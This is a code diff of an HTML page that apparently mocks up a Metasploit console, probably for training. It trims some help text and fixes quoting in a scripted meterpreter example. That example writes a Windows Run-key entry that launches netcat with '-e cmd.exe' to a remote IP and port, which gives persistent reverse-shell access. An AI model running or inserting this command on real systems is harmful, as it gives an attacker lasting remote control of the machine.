@@ -54,7 +54,6 @@
             Type '?' for this help text<br />
             Type 'search windows' for a list of windows exploits<br />
             Type 'use handler' to use handler<br />
-            Type 'use exploit' to use exploit<br />
           </p>
         </div>
         <div id="search-windows" class="msf-console-command-text">
@@ -157,9 +156,6 @@
           </p>
           <p>Type '?' for available commands</p>
         </div>
-        <div id="use-exploit" class="msf-console-command-text">
-          <p>Insert stuff here for exploits</p>
-        </div>
         <div id="command-not-found" class="msf-console-command-text">
           <p>Command not found. Type '?' for help.</p>
         </div>
@@ -216,7 +212,7 @@
             <u>meterpreter</u> > reg setval -k
             HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d
             \<br />
-            'C:\windows\system32\nc.exe 153.22.8.10 8221 -e cmd.exe
+            'C:\windows\system32\nc.exe 153.22.8.10 8221 -e cmd.exe'
           </p>
           <p>Successfully set nc of REG_SZ.</p>
           <p>
